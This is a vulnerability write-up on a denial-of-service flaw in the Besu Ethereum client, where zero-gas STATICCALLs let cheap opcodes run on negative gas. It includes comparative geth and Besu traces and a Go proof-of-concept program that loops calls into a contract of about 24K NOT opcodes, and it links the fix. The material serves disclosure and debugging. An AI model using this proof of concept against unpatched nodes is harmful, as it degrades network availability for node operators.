# Besu DoS issue

Executing the test on geth `evm`: 
- it does a `staticcall( address: 0x22, gas:0, 0,0,0,0)`. 
- on `0x22`: it immediately goes out of gas, since zero was provided, 
- it returns, and the program stops. 
```
$ ~/workspace/evm --json statetest ./00002762-naivefuzz-0.json.base 
{"pc":0,"op":96,"gas":"0x79bc18","gasCost":"0x3","memSize":0,"stack":[],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":2,"op":96,"gas":"0x79bc15","gasCost":"0x3","memSize":0,"stack":["0x0"],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":4,"op":96,"gas":"0x79bc12","gasCost":"0x3","memSize":0,"stack":["0x0","0x0"],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":6,"op":96,"gas":"0x79bc0f","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0"],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":8,"op":96,"gas":"0x79bc0c","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0","0x0"],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":10,"op":96,"gas":"0x79bc09","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0","0x0","0x22"],"depth":1,"refund":0,"opName":"PUSH1"}
{"pc":12,"op":250,"gas":"0x79bc06","gasCost":"0xa28","memSize":0,"stack":["0x0","0x0","0x0","0x0","0x22","0x0"],"depth":1,"refund":0,"opName":"STATICCALL"}
{"pc":0,"op":96,"gas":"0x0","gasCost":"0x3","memSize":0,"stack":[],"depth":2,"refund":0,"opName":"PUSH1","error":"out of gas"}
{"pc":13,"op":0,"gas":"0x79b1de","gasCost":"0x0","memSize":0,"stack":["0x0"],"depth":1,"refund":0,"opName":"STOP"}
{"output":"","gasUsed":"0xa3a","time":145782}
{"stateRoot": "2d2adfd2db2de9092194f61077cdcfd67f03599e3a839e88bb05d17d7495dd83"}
[
  {
    "name": "00002762-naivefuzz-0",
    "pass": false,
    "fork": "London",
    "error": "post state root mismatch: got 2d2adfd2db2de9092194f61077cdcfd67f03599e3a839e88bb05d17d7495dd83, want 0000000000000000000000000000000000000000000000000000000000000000"
  }
]
```

Doing the same on besu -- the `staticcall` destination contract actually executes some opcodes. Not until it reaches the `RETURN` does 
it detect that it was running on negative gas, and errors out:

```
 ~/workspace/besu-vm --json --nomemory state-test ./00002762-naivefuzz-0.json.base 
{"pc":0,"op":96,"gas":"0x79bc18","gasCost":"0x3","memSize":0,"stack":[],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":2,"op":96,"gas":"0x79bc15","gasCost":"0x3","memSize":0,"stack":["0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":4,"op":96,"gas":"0x79bc12","gasCost":"0x3","memSize":0,"stack":["0x0","0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":6,"op":96,"gas":"0x79bc0f","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":8,"op":96,"gas":"0x79bc0c","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0","0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":10,"op":96,"gas":"0x79bc09","gasCost":"0x3","memSize":0,"stack":["0x0","0x0","0x0","0x0","0x22"],"returnData":"0x","depth":1,"refund":0,"opName":"PUSH1","error":""}
{"pc":12,"op":250,"gas":"0x79bc06","gasCost":"0xa28","memSize":0,"stack":["0x0","0x0","0x0","0x0","0x22","0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"STATICCALL","error":""}
{"pc":0,"op":96,"gas":"0x0","gasCost":"0x3","memSize":0,"stack":[],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":2,"op":96,"gas":"0xfffffffffffffffd","gasCost":"0x3","memSize":0,"stack":["0x20"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":4,"op":243,"gas":"0xfffffffffffffffa","gasCost":"0x3","memSize":0,"stack":["0x20","0x0"],"returnData":"0x","depth":2,"refund":0,"opName":"RETURN","error":"Out of gas"}
{"pc":13,"op":0,"gas":"0x79b1de","gasCost":"0x0","memSize":0,"stack":["0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"STOP","error":""}
{"output":"","gasUsed":"0x6022","time":43461454,"Mgps":"0.566","test":"00002762-naivefuzz-0","fork":"London","d":0,"g":0,"v":0,"postHash":"0x2d2adfd2db2de9092194f61077cdcfd67f03599e3a839e88bb05d17d7495dd83","postLogsHash":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","pass":false}

```

Since it eventually detects this (either on return on on a new forward-call), the besu stateroot becomes identical with the geth one. 
However, it should be possible to crash this, e.g. with a humongous alloc. However, it seems that the error is also detected when `MSTORE` is executed!

When trying an infinite loop, the error is also detected on the `JUMPDEST`: 
```
{"pc":0,"op":96,"gas":"0x0","gasCost":"0x3","memSize":0,"stack":[],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":2,"op":91,"gas":"0xfffffffffffffffd","gasCost":"0x1","memSize":0,"stack":["0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"JUMPDEST","error":"Out of gas"}
```
A lot of the instructions seem to trigger the detection of the error, but simple ones like `PUSH` sail right on by: 
```
{"pc":12,"op":250,"gas":"0x79bc06","gasCost":"0xa28","memSize":0,"stack":["0x0","0x0","0x0","0x0","0x22","0x0"],"returnData":"0x","depth":1,"refund":0,"opName":"STATICCALL","error":""}
{"pc":0,"op":96,"gas":"0x0","gasCost":"0x3","memSize":0,"stack":[],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":2,"op":96,"gas":"0xfffffffffffffffd","gasCost":"0x3","memSize":0,"stack":["0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":4,"op":96,"gas":"0xfffffffffffffffa","gasCost":"0x3","memSize":0,"stack":["0x1","0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":6,"op":96,"gas":"0xfffffffffffffff7","gasCost":"0x3","memSize":0,"stack":["0x1","0x1","0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":8,"op":96,"gas":"0xfffffffffffffff4","gasCost":"0x3","memSize":0,"stack":["0x1","0x1","0x1","0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":10,"op":96,"gas":"0xfffffffffffffff1","gasCost":"0x3","memSize":0,"stack":["0x1","0x1","0x1","0x1","0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"PUSH1","error":""}
{"pc":12,"op":0,"gas":"0xffffffffffffffee","gasCost":"0x0","memSize":0,"stack":["0x1","0x1","0x1","0x1","0x1","0x1"],"returnData":"0x","depth":2,"refund":0,"opName":"STOP","error":"Out of gas"}
```



---

This big switch here: https://github.com/hyperledger/besu/blob/f20b4b3bd1af09730b1e1172643d09f3691ee420/evm/src/main/java/org/hyperledger/besu/evm/EVM.java#L130 -- the ones that are 'direct' there, e.g mul, xor, push, can be used, but the others cannot. So for example `MUL` works, but `DIV` is a 'detector', triggering the detection of "we are on negative gas", and exiting the execution. 

One way to exploit this, is to fill a contract with `PUSH1 1` followed by `24K` `NOT`, and just call it in a loop (with zero gas) . Using (only) 8M gas, leads to `24s` execution time. 

Program `a`: 
```
	a := NewProgram()
	loc := a.Jumpdest()
	a.Call(big.NewInt(0), big.NewInt(0x22), big.NewInt(0), 0, 0, 0, 0)
	a.Op(ops.POP)
	a.Jump(loc)
```
calls Progam `b` at address `0x22`: 
```
	b := NewProgram()
	b.Push(0x01)
	for i := 0; i < 24570; i++ {
		b.Op(ops.NOT)
	}
```
Geth executes this in `70ms`, which is `59K` calls. In besu's case, that leads to somewhere on the order of `1351M` instructions performed on `8M gas`. 


--- 

Fixed by https://github.com/hyperledger/besu/pull/4756
